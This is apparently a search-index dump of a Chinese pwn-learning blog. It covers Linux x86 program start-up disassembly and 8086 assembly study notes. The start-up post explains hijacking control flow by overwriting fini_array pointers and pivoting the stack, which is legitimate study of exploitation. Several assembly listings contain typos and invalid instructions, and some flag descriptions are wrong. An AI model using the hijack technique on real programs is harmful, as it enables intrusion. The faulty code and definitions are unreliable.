.text:00000000004005DE mov r13, rdx .text:00000000004005E1 sub rbp, r12 .text:00000000004005E4 sub rsp, 8 .text:00000000004005E8 sar rbp, 3 .text:00000000004005EC call _init_proc .text:00000000004005F1 test rbp, rbp .text:00000000004005F4 jz short loc_400616 .text:00000000004005F6 xor ebx, ebx .text:00000000004005F8 nop dword ptr [rax+rax+00000000h] .text:0000000000400600 .text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j .text:0000000000400600 mov rdx, r13 .text:0000000000400603 mov rsi, r14 .text:0000000000400606 mov edi, r15d .text:0000000000400609 call qword ptr [r12+rbx*8] .text:000000000040060D add rbx, 1 .text:0000000000400611 cmp rbx, rbp .text:0000000000400614 jnz short loc_400600 .text:0000000000400616 .text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j .text:0000000000400616 add rsp, 8 .text:000000000040061A pop rbx .text:000000000040061B pop rbp .text:000000000040061C pop r12 .text:000000000040061E pop r13 .text:0000000000400620 pop r14 .text:0000000000400622 pop r15 .text:0000000000400624 retn .text:0000000000400624 __libc_csu_init endp __libc_csu_init函数会调用get_pc_truck。它是给位置无关码使用的。设置它们可以让位置无关码正常工作。为了让它们工作，基址寄存器（%ebp）需要知道GLOBAL_OFFSET_TABLE（GOT）。该函数的主要目的其实是获取变量对应的GOT，以通过它获取变量真正的值。 之后会进入一个循环中，为main设置环境，和寄存器参数。下面的函数都在循环中执行 然后，我们来看gmon_start函数。如果它是空的，我们跳过它，不调用它。否则，调用它来设置profiling。该函数调用一个例程开始profiling，并且调用at_exit去调用另一个程序运行,并且在运行结束的时候生成gmon.out。 接下来frame_dummy函数会被调用。其目的是调用__register_frame_info函数，但是，调用frame_dummy是为了给上述函数设置参数。 之后是__do_global_ctors_aux 。。。。 最后跳出循环，回到__libc_start_main，__libc_start_main去调用我们的mian。 ","date":"2020-10-13","objectID":"/linux-x86-program-start-up/:0:0","series":null,"tags":["Pwn"],"title":"Linux X86 Program Start Up","uri":"/linux-x86-program-start-up/#程序开始"},{"categories":["Pwning"],"content":"结束进程正常结束有两种情况： main正常返回，由__libc_start_main来调用exit函数。 程序中直接使用exit退出。 __libc_csu_fini函数 .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+Fo .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1Bj .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp 在.text:0000000000402988这个地方有一个call指令,结合前面的代码可以知道rbp保存的是fini_array的值,所以这里会调用fini_array中的函数.所以只要修改了fini_array的数值,我们就可以劫持eip.看一下fini_array的代码: .fini_array:``00000000004B40F0` `_fini_array segment para public ``'DATA'` `use64 .fini_array:``00000000004B40F0` `assume cs:_fini_array .fini_array:``00000000004B40F0` `;org ``4B40F0h .fini_array:``00000000004B40F0` `_fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:``000000000040291Co .fini_array:``00000000004B40F0` `; __libc_csu_fini``+``8o .fini_array:``00000000004B40F8` `dq offset sub_401580 .fini_array:``00000000004B40F8` `_fini_array ends 这里保存了两个函数指针,分别是fini_array[0]和fini_array[1],观察libc_csu_fini中的汇编代码我们可以得知这俩函数指针是反向执行的,先执行fini_array[1],再执行fini_array[0].如果我们将fini_array[0]覆盖为libc_csu_fini的地址,再将fini_array[1]覆盖为任意一个地址A,那么程序就会循环执行A地址的代码,直到fini_array[0]覆盖为其他值. 其次,在.text:0000000000402968可以修改rbp为fini_array的首地址,配合leave;ret可以把栈迁移到fini_array. 参考：__libc_start_main ","date":"2020-10-13","objectID":"/linux-x86-program-start-up/:0:0","series":null,"tags":["Pwn"],"title":"Linux X86 Program Start Up","uri":"/linux-x86-program-start-up/#结束"},{"categories":["Pwning"],"content":"汇编语言（3）","date":"2020-10-01","objectID":"/assembly-3/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#汇编语言3"},{"categories":["Pwning"],"content":"13、int int n ;n为中断类型码 ;可以用作一种特殊的函数调用方式。 assume cs:code code segment start: mov ax,cs ;源程序位置 mov ds,ax mov si,offset s0 mov ax,0 ;目标程序位置 mov es,0 mov di,200h moc cx,offset s0-offset s0end cld ;正向传输安装 rep movsb mov ax,0 ;更新向量表 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21h ;下面是中断程序的内容 s0: mul ax iret s0end: nop code ends end start assume cd:code code segment start: mov ax,cs ;源程序位置 mov ds,ax mov si,offset s0 mov ax,0 ;目标程序位置 mov es,0 mov di,200h mov cx,offset lp-offset lpend cld ;正向传输安装 rep movsb mov ax,0 ;更新向量表 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21h ;下面是中断程序的内容 lp: push bp mov bp,sp dec cx ;外部cx代表循环次数，需要提供 jcxz lpret add[bp+2],bx ;bx代表所循环程序的长度 ;ss:[bp+2]中为中断执行后的IP，加上长度就回到了程序开始 lpret: pop bp iret lpend: nop code ends end start ","date":"2020-10-01","objectID":"/assembly-3/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#13int"},{"categories":["Pwning"],"content":"14、端口端口：计算机与外界交流的门户。 CPU可以直接读写3个地方的数据：CPU内部寄存器，内存单元，端口。 ","date":"2020-10-01","objectID":"/assembly-3/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#14端口"},{"categories":["Pwning"],"content":"1、基本概念不能使用mov、push、pop，使用in，out。 in al,60h out 21h,al shl ;逻辑左移 shr ;逻辑右移 mov ax,36h mov cl,3 shl ax,cl shr ax,cl ;当移动位数大于1时，必须将移动位数放入cl ;移动1位时，CF会储存被移出的那一位 ","date":"2020-10-01","objectID":"/assembly-3/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1基本概念"},{"categories":["Pwning"],"content":"2、CMOS RAM芯片CMOS RAM芯片储存了时间信息，由电池供电，保证时间正常计算。70h为地址端口，71h为数据端口。 数据以BCD码的方式存放，0~9的四位二进制码。 BCD码+30h=十进制数的ASCII码，所以取出数据的高8位和低8位都要加30h。 mov ah,al ;al中位从芯片8号单元读出的数据 mov cl,4 shr ah,cl ;ah中位月份的十位数码值 and al,00001111b;al中位月份的个位数码值 ","date":"2020-10-01","objectID":"/assembly-3/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2cmos-ram芯片"},{"categories":["Pwning"],"content":"15、外中断","date":"2020-10-01","objectID":"/assembly-3/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#15外中断"},{"categories":["Pwning"],"content":"1、基本概念分为可屏蔽中断和不可屏蔽中断。 IF=1,则CPU执行完当前指令后，响应中断；IF=0，则不响应。 参照中断处理的过程，IF置0是为了防止其他中断的干扰。 sti，设置IF=1；cli，设置IF=0。 ","date":"2020-10-01","objectID":"/assembly-3/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1基本概念-1"},{"categories":["Pwning"],"content":"2、键盘处理按下一个键时，会产生一个扫描码，称为通码，松开时产生的扫描码称为断码。扫描码的长度为一个字节，通码的第7位为0，断码的第七位为1，即：断码=通码+80h。扫描码送到60h端口。 键盘的输入到达60h端口时，相关芯片发送中断类型码9，CPU执行int 9中断例程处理键盘输入。 int 9中断例程，会产生与扫描码对应的字符码，放入BIOS键盘缓冲区，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码。 ","date":"2020-10-01","objectID":"/assembly-3/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2键盘处理"},{"categories":["Pwning"],"content":"3、编写int 9中断 assume cs:code stack segment db 128 dup (0) stack ends data segment dw 0,0 data ends code segment start mov ax,0b800h mov es,ax mov ah,'a' s: mov es:[160*12+40*2],ah call delay inc ah cmp ah,'z' jna s mov ax,4c00h int 21h delay: push ax push dx mov dx,1000h ;外层循环数 1000H mov ax,0 ;内层循环数是1 0000h s1: sub ax,1 sbb dx,0 cmp ax,0 jne s1 cmp dx,0 jne s1 pop dx pop ax ret code ends end start ","date":"2020-10-01","objectID":"/assembly-3/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#3编写int-9中断"},{"categories":["Pwning"],"content":"16、直接定址表","date":"2020-10-01","objectID":"/assembly-3/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#16直接定址表"},{"categories":["Pwning"],"content":"1、标号 a: db 1,2,3,4,5,6,7,8 b: dw 0 ;这里a，b进阶表示内存单元的地址,后面加有”：“的地址标号，只能在代码段使用 a db 1,2,3,4,5,6,7,8 b dw 0 ;这里a，b同时描述内存地址和单元长度，称为数据标号； ;a，cs：0后的内存单元为字节单元，b，cs：8后的内存单元为字单元 mov ax,b ;mov ax,cs:[8] mov b,2 ;mov word ptr cs:[8],2 inc b ;inc word ptr cs:[8] mov al,a[bx+si+3] ;mov al,cs:0[bx+si+3] seg ;取得某一标号的段地址 ","date":"2020-10-01","objectID":"/assembly-3/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1标号"},{"categories":["Pwning"],"content":"2、直接定址表通过位移建立数据之间的映射关系。依据数据，直接计算出所要找的元素的位置的表。 ","date":"2020-10-01","objectID":"/assembly-3/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#2直接定址表"},{"categories":["Pwning"],"content":"17、使用BIOS进行键盘输入和磁盘读写int 9h中断将键盘的输入数据放入键盘缓冲区 int 16h将ah作为参数传递寄存器，从键盘读取一个输入，并将其从缓冲区删除。 检测键盘缓冲区中是否有数据 没有则继续第一步 读取缓冲区第一个字单元的键盘输入 将读取的扫描码送入ah，ASCII送入al； 将已读取的键盘输入从缓冲区中删除。 ","date":"2020-10-01","objectID":"/assembly-3/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#17使用bios进行键盘输入和磁盘读写"},{"categories":["Pwning"],"content":"1、字符串使用栈处理字符串的输入， 调用int 16h读取键盘输入； 如果是字符，进入字符栈，显示字符栈中的所有字符；继续执行1； 如果是退格键，从字符栈中弹出一个字符，显示字符栈中的所有字符；继续执行1； 如果是Enter键，向字符栈中压入0，返回。 ","date":"2020-10-01","objectID":"/assembly-3/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 3","uri":"/assembly-3/#1字符串"},{"categories":["Pwning"],"content":"汇编语言（2）","date":"2020-10-01","objectID":"/assembly-2/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#汇编语言2"},{"categories":["Pwning"],"content":"8、数据处理","date":"2020-10-01","objectID":"/assembly-2/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#8数据处理"},{"categories":["Pwning"],"content":"1、bx，si，di，bpreg（寄存器）：ax、bx、cx、dx、ah、al、bh、bl、ch、cl、dh、dl、sp、bp、si、di； sreg（段寄存器）：ds、ss、cs、es（扩展段，辅助作用）； 只有这四个寄存器用在“[…]”中来进行内存单元的寻址。 下面这两种语法是错误的 mov ax,[si+di] mov sx,[bx+bp] 若在“[…]”中使用bp，而指令没有显性给出段地址时，段地址默认在ss中。 ","date":"2020-10-01","objectID":"/assembly-2/:1:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1bxsidibp"},{"categories":["Pwning"],"content":"2、数据的长度在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte。 mov word ptr ds:[0],1 inc word ptr ds:[0] inc byte ptr ds:[0] add byte ptr [bx],2 push,pop只对字进行操作。 ","date":"2020-10-01","objectID":"/assembly-2/:1:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2数据的长度"},{"categories":["Pwning"],"content":"3、结构体 mov ax,seg mov ds,ax mov bx,60h mov word ptr [bx+0ch],38 ;一个数据段中紧挨着存放了不同的信息 mov word ptr [bx+0eh],70 ;类似c语言的结构体 mov si,0 mov byte ptr [bx+10+si],'V' inc si mov byte ptr [bx+10+si],'A' inc si mov byte ptr [bx+10+si],'X' ","date":"2020-10-01","objectID":"/assembly-2/:1:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3结构体"},{"categories":["Pwning"],"content":"4、div被除数默认放在AX或AX和DX中，若除数为8位，则被除数位16位，在ax中存放；若除数为16位，被除数位32位，在DX和AX中存放，ax存放低16位。 ;格式 ;div reg ;div 内存单元 div byte ptr ds:[0] ;(a1)=(ax)/((ds)*16+0)的商 ;(ah)=(ax)/((ds)*16+0)的余数 div word ptr es:[0] ;(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商 ;(bx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数 ","date":"2020-10-01","objectID":"/assembly-2/:1:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4div"},{"categories":["Pwning"],"content":"9、转移指令","date":"2020-10-01","objectID":"/assembly-2/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#9转移指令"},{"categories":["Pwning"],"content":"1、offset mov ax,offset start ;取得标号的偏移地址 ","date":"2020-10-01","objectID":"/assembly-2/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1offset"},{"categories":["Pwning"],"content":"2、jmp观察机器码，可以发现立即数（idata）会在机器码中有所体现。jmp指令机器码中以补码的形式体现。 cs:0000 mov ax,0123h ;B8 23 01 cs:0003 jmp s ;EB 03，执行jmp后，ip+2变为05 cs:0005 add ax,1 ;实际作用是jmp执行后向下跳3个字节 cs:0008 s: inc ax ;jmp将ip=ip+03=08,03为补码的十六进制 jmp short s ;段内短转移，（ip）=（ip）+8位位移 jmp near ptr s ;段内近转移，（ip）=（ip）+16位位移 jmp far ptr s ;段间转移，直接修改cs：ip jmp word ptr 内存地址单元 ;段内近转移，（ip）=(内存地址单元) jmp dword ptr 内存地址单元;段间转移 ;(cs)=(内存地址单元+2),(ip)=(内存地址单元) ","date":"2020-10-01","objectID":"/assembly-2/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2jmp"},{"categories":["Pwning"],"content":"3、jcxz jcxz 标号 ;if((cx)==0) ; jmp 标号 ","date":"2020-10-01","objectID":"/assembly-2/:2:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3jcxz"},{"categories":["Pwning"],"content":"10、CALL和RET指令","date":"2020-10-01","objectID":"/assembly-2/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#10call和ret指令"},{"categories":["Pwning"],"content":"1、ret和retf ret ;等价于pop ip ;(ip)=((ss)*16+(sp)) ;(sp)=(sp)+2 retf ;等价于pop ip,pop cs ;(ip)=((ss)*16+(sp)) ;(sp)=(sp)+2 ;(cs)=((ss)*16+(sp)) ;(sp)=(sp)+2 ","date":"2020-10-01","objectID":"/assembly-2/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1ret和retf"},{"categories":["Pwning"],"content":"2、call call s ;(sp)=(sp)-2 push ip ;((ss)*16+(sp))=(ip) ;(ip)=(ip)+16位位移 jmp near ptr 标号 ;16位位移=标号处地址-call指令的第一个字节的地址 call far ptr s ;(sp)=(sp)-2 push cs ;((ss)*16+(sp))=(cs) push ip ;(sp)=(sp)-2 ;((ss)*16+(sp))=(ip) ;(cs)=标号所在的段地址 jmp far ptr 标号 ;(ip)=标号在段中的偏移地址 call 16位reg ;(sp)=(sp)-2 ;((ss)*16+(sp))=(cs) ;(ip)=(16位reg) call word ptr 内存单元地址 ;push ip ;jmp word ptr 内存单元地址 call dword ptr 内存单元地址 ;push cs ;push ip ;jmp dword ptr 内存单元地址 ","date":"2020-10-01","objectID":"/assembly-2/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2call"},{"categories":["Pwning"],"content":"4、mul mul reg mul 内存单元 mul byte ptr ds:[0] ;(ax)=(al)*((ds)*16+0) mul word ptr [bx+si+8] ;(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位 ;(dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位 ","date":"2020-10-01","objectID":"/assembly-2/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4mul"},{"categories":["Pwning"],"content":"5、实验 assume cs:code data segment data ends stack segment dw 8 dup(0) stack ends code segment start: mov ax,stack mov ss,ax mov sp,10h mov ax,4240h mov dx,0fh mov cx,0ah call divdw mov ax, int 21h divdw: push ax ;保存低16位 mov ax,dx ;ax此时位H mov dx,0 div cx ;高16位除以除数 mov bx,ax ;H/N的商，放入高位商的储存位置 pop ax div cx ;低16位除以除数 mov cs,dx mov dx,bx ret code ends end start ","date":"2020-10-01","objectID":"/assembly-2/:3:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#5实验"},{"categories":["Pwning"],"content":"11、标志寄存器flag寄存器有16位，其中储存的信息被称为程序状态字（PSW）。 作用： （1）用来储存相关指令的某些执行结果； （2）用来为CPU执行相关指令提供行为依据； （3）用来控制CPU的相关工作方式。 值 15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0 flag OF DF IF TF SF ZF AF PF CF 1 OV DN NG ZR PE CY 0 NV UP PL NZ PO NC flag的1、3、5、12、3、14、15没有任何含义。其他有特殊含义。 ","date":"2020-10-01","objectID":"/assembly-2/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#11标志寄存器"},{"categories":["Pwning"],"content":"1、ZF、PF、SF、CF、OFZF（零标志位）：指令执行后，结果为0，则ZF=1，否则为0。 PF（奇偶标志位）：指令执行后，结果为偶数，则PF=1，否则为0。 SF（符号标志位）：指令执行后，结果为负数，则SF=1，否则为0。 当我们将数据当作有符号数来运算时，SF标志位才有意义 CF（进位标志位）：在进行无符号数运算的时候，它记录了运算结果的最高有效位向更高位的进位值。 例如，两个八位数据：98H+98H，将产生进位，8位数无法保存，更高的位被记录在CF中。 借位时也会发生改变。 OF（溢出标志位）：在进行有符号数运算时，若运算结果超出机器所能表达的范围，将产生溢出。产生溢出的溢出放入OF。 ","date":"2020-10-01","objectID":"/assembly-2/:4:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1zfpfsfcfof"},{"categories":["Pwning"],"content":"2、adc、sbb、cmp adc ax,bx ;(ax)=(ax)+(bx)+CF ;例计算1EF000H+201000H mov ax,001eh ;存低位 mov bx,0f000h ;存高位 add bx,1000h ;低位相加 adc ax,0020h sbb ax,bx ;(ax)=(ax)-(bx)-CF ;例计算003E1000H-00202000H mov bx,1000h ;存低位 mov ax,003eh ;存高位 sub bx,2000h ;低位相减 sbb ax,0020h cmp ax,bx ;(ax)-(bx)，用来影响flag各位的值。 ;无符号数的比较 ;(ax)=(bx),ZF=1; ;(ax)≠(bx),ZF=0; ;(ax)\u003c(bx),CF=1; ;(ax)≥(bx),CF=0; ;(ax)\u003e(bx),CF=0\u0026\u0026ZF=0; ;(ax)≤(bx),CF=1||ZF=1; ;有符号数的比较 ;SF=1\u0026\u0026OF=0,(ax)\u003c(bx) ;SF=1%%OF=1,(ax)\u003e(bx) ;SF=0\u0026\u0026OF=1,(ax)\u003c(bx) ;SF=0\u0026\u0026OF=0,(ax)≥(bx) ","date":"2020-10-01","objectID":"/assembly-2/:4:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2adcsbbcmp"},{"categories":["Pwning"],"content":"3、条件转移指令jump,not,equal,below,above 指令 含义 检测的flag je 等于则转移 ZF=1 jne 不等于则转移 ZF=0 jb 低于则转移 CF=1 jnb 不低于则转移 CF=0 ja 高于则转移 CF=0,ZF=0 jna 不高于则转移 CF=1 or ZF=1 ","date":"2020-10-01","objectID":"/assembly-2/:4:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3条件转移指令"},{"categories":["Pwning"],"content":"4、DF和串传送指令DF（方向标志位） movsb ;(1)((es)*16+(di))=((ds)*16+(si)) ;(2)if df=0,(si)=(si)+1,(di)=(di)+1 ; if df=1,(si)=(si)-1,(di)=(di)-1 movsw ;(1)((es)*16+(di))=((ds)*16+(si)) ;(2)if df=0,(si)=(si)+2,(di)=(di)+2 ; if df=1,(si)=(si)-2,(di)=(di)-2 rep movsb ;s:movsb ; loop s cld ;设置df=0，正向传送 std ;设置df=1 ","date":"2020-10-01","objectID":"/assembly-2/:4:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4df和串传送指令"},{"categories":["Pwning"],"content":"5、pushf和popfpushf：将标志寄存器的值压栈。 popf：将栈中的数据弹出，送入标志寄存器。 ","date":"2020-10-01","objectID":"/assembly-2/:4:5","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#5pushf和popf"},{"categories":["Pwning"],"content":"12、内中断 产生中断信息的四种情况： （1）除法错误，如：div指令产生的除法溢出； 0号中断 （2）单步执行； 1号中断 （3）执行into指令； （4）执行int指令。 ","date":"2020-10-01","objectID":"/assembly-2/:5:0","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#12内中断"},{"categories":["Pwning"],"content":"1、中断向量表储存着中断处理程序的入口地址的列表，在内存0000：0000到0000：03FF的1024个单元存放，一个物理地址占四个字节，低位为ip，高位为cs。 ","date":"2020-10-01","objectID":"/assembly-2/:5:1","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#1中断向量表"},{"categories":["Pwning"],"content":"2、中断处理过程 取得中断类型码N； pushf TF=0，IF=0； push cs push ip （ip）=(N *4)，(cs)=(N *4+2) 开始运行中断处理程序（用iret返回） ","date":"2020-10-01","objectID":"/assembly-2/:5:2","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#2中断处理过程"},{"categories":["Pwning"],"content":"3、编程处理0号中断 assume cs:code code segment start: mov ax,0 ;目标程序地址 mov es,ax mov di,200H mov ax,cs ;源程序地址 mov ds,ax mov si,offset do0 mov cx,offset do0end-offset do ;传输代码的长度 cld ;正向传输 rep movsb ;传输 mov ax,0 ;设置中断向量表，指向我们规定的程序入口 mov es,ax mov word ptr es:[0*4],200h mov word ptr es:[0*4+2],0 mov ax,4c00h int 21h do: jmp short do0 db 'overflow!' ;用来存放‘overflow！’ do0: mov ax,cs ;字符串的地址 mov ds,ax mov si,202h mov ax,0b800h ;字符串要显示的位置 mov es.ax mov di,12*160+36*2 mov cx,9 s: mov al,[si] mov es:[di],al inc si add di,2 loop s mov ax,4c00h int 21h do0end: nop code ends end start ","date":"2020-10-01","objectID":"/assembly-2/:5:3","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#3编程处理0号中断"},{"categories":["Pwning"],"content":"4、单步中断若TF=1，则会产生单步中断。 取得中断类型码1； 标志寄存器入栈，TF=0,IF=0； CS,IP入栈 (IP)=(1 *4),(CS)=(1 *4+2) 在Debug中，t命令使TF=1，进入单步中断程序，TF又被设置为0，来防止单步中断循环发生。 在执行完向ss寄存器传送数据的指令后，CPU不会响应中断。因为ss：sp的设置要连续完成。 mov ax,1000h mov ss,ax mov ax,0 ;这一步直接被忽略 mov sp,0 ","date":"2020-10-01","objectID":"/assembly-2/:5:4","series":null,"tags":["Pwn"],"title":"Assembly 2","uri":"/assembly-2/#4单步中断"},{"categories":["Pwning"],"content":"汇编语言（1） 教程使用王爽老师的《汇编语言》（第三版），这里仅仅介绍了32位处理器，建议再阅读近几年的教程学习64位处理器的一些结构与指令。 如果你有一些c或c++的语言基础，在学习汇编时会更加深刻的理解数组、内存等基本概念，其中也有很多规定对应了现在的计算机为什么那么设置。 总之，建议认真学习。 ","date":"2020-10-01","objectID":"/assembly-1/:0:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#汇编语言1"},{"categories":["Pwning"],"content":"1、基础知识存储单元的概念，CPU对存储器的读写，地址总线，数据总线，控制总线 内存地址空间，RAM,ROM ","date":"2020-10-01","objectID":"/assembly-1/:1:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1基础知识"},{"categories":["Pwning"],"content":"2、寄存器","date":"2020-10-01","objectID":"/assembly-1/:2:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2寄存器"},{"categories":["Pwning"],"content":"1、通用寄存器AX,BX,CX,DX存放一般数据的16位寄存器，可分为八位寄存器使用-H,-L。 ","date":"2020-10-01","objectID":"/assembly-1/:2:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1通用寄存器"},{"categories":["Pwning"],"content":"2、CPU给出物理地址CPU将内存分段，基础地址（段地址×16）+偏移地址=物理地址 ","date":"2020-10-01","objectID":"/assembly-1/:2:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2cpu给出物理地址"},{"categories":["Pwning"],"content":"3、段寄存器CS,DS,SS,ES段寄存器，CS为代码段寄存器，IP为指令指针寄存器 1、从CS：IP指向的内存单元读取指令，读取的指令进入指令缓冲器： 2、IP=IP+所读取指令的长度，从而指向下一条指令： 3、执行指令。转到步骤1，重复这个过程。 ","date":"2020-10-01","objectID":"/assembly-1/:2:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3段寄存器"},{"categories":["Pwning"],"content":"4、几个汇编指令 mov ax,dx ;dx中的值放入ax中，dx不变 mov ax,16 ;ax中的值+16 mov al,dh ;dh中的值放入al中 add ax,dx ;ax=ax+dx add ah,4 ;ah=ah+4 jmp 1000:3 ;cs=1000,ip=3，jmp用来修改cs：ip的值 jmp bx ;ip=bx ","date":"2020-10-01","objectID":"/assembly-1/:2:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4几个汇编指令"},{"categories":["Pwning"],"content":"5、实验1查看、修改CPU中寄存器的内容：R命令 查看内存中的内容：D命令 修改内存中的内容：E命令 将内存中的内容解释为机器指令和对应的汇编指令：U命令 执行CS:IP指向的内存单元处的指令：T命令 以汇编指令的形式向内存中写入指令：A命令3 ","date":"2020-10-01","objectID":"/assembly-1/:2:5","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#5实验1"},{"categories":["Pwning"],"content":"3、寄存器（内存访问）字单元：存放一个字型数据（16位）的内存单元 ","date":"2020-10-01","objectID":"/assembly-1/:3:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3寄存器内存访问"},{"categories":["Pwning"],"content":"1、DS寄存器：通常用来存放要访问数据的段地址。 mov bx,1000H mov ds,bx ；ds不支持直接送入数据，所以用bx做中转。 mov ax,[0] ；将1000：0内存单元的字型数据放入ax ；[···]表示一个内存单元，[]其中的值代表偏移地址 ；[0]的段地址，系统自动访问ds ","date":"2020-10-01","objectID":"/assembly-1/:3:1","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#1ds寄存器"},{"categories":["Pwning"],"content":"2、mov，add，sub sub ax,bx ;ax=ax-bx 操作 mov add sub 寄存器，数据 1 1 1 寄存器，寄存器 1 1 1 寄存器，内存单元 1 1 1 内存单元，寄存器 1 1 1 段寄存器，寄存器 1 0 0 寄存器，段寄存器 1 0 0 内存单元，段寄存器 1 0 0 ","date":"2020-10-01","objectID":"/assembly-1/:3:2","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#2movaddsub"},{"categories":["Pwning"],"content":"3、数据段专门用来存储数据的一段内存空间 ","date":"2020-10-01","objectID":"/assembly-1/:3:3","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#3数据段"},{"categories":["Pwning"],"content":"4、栈 push ax ;入栈，将ax中的数据放入栈 pop ax ;出栈，将栈顶的数据取出到ax 段寄存器SS：存放栈顶的段地址，寄存器SP：存放栈顶的偏移地址。 任意时刻SS：SP指向栈顶元素。栈为空时，不存在栈顶元素。 push ax： （1）：SP=SP-2，栈顶更新； （2）：将ax中的数据送入SS：SP指向的内存单元 pop ax: （1）：将栈顶的数据取出到ax；SP=SP+2 （2）：SP=SP+2，栈顶更新； pop，push可以对寄存器，段寄存器，内存单元进行操作。 栈顶超界问题 向上，向下溢出，造成对其他内存单元数据的覆盖，暴露。 ","date":"2020-10-01","objectID":"/assembly-1/:3:4","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4栈"},{"categories":["Pwning"],"content":"4、第一个程序","date":"2020-10-01","objectID":"/assembly-1/:4:0","series":null,"tags":["Pwn"],"title":"Assembly 1","uri":"/assembly-1/#4第一个程序"},{"categories":["Pwning"],"content":"1、一些基本概念程序的执行过程： 